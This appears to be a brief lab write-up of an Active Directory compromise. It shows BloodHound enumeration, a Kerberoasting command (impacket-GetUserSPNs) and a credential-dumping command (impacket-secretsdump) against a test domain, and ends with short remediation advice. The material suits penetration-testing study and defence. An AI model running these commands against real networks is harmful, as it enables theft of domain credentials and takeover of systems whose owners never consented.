# Advanced Active Directory Compromise & BloodHound Analysis

Comprehensive attack path analysis demonstrating lateral movement and domain escalation via Kerberoasting and ACL abuse in an Active Directory environment.

## 1. Domain Enumeration

Initial mapping of domain controllers, users, and trusts using BloodHound and PowerView.

```powershell
Invoke-BloodHound -CollectionMethod All -Domain corp.local
```

- **Domain Controller:** dc01.corp.local
- **Target Group:** Domain Admins

## 2. Exploitation & Lateral Movement

Extracted service principal names (SPNs) for offline cracking and abused vulnerable access control lists (ACLs) to gain privileged credentials.

```bash
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 10.10.10.5 -request
```

## 3. Privilege Escalation

Utilized harvested administrative tokens to achieve domain-wide execution privileges (Domain Admin).

```bash
impacket-secretsdump corp.local/administrator:Hash@10.10.10.5
```

## 4. Remediation

- Enforce strong, complex passwords for service accounts.
- Audit and harden Active Directory ACLs to prevent permission abuse.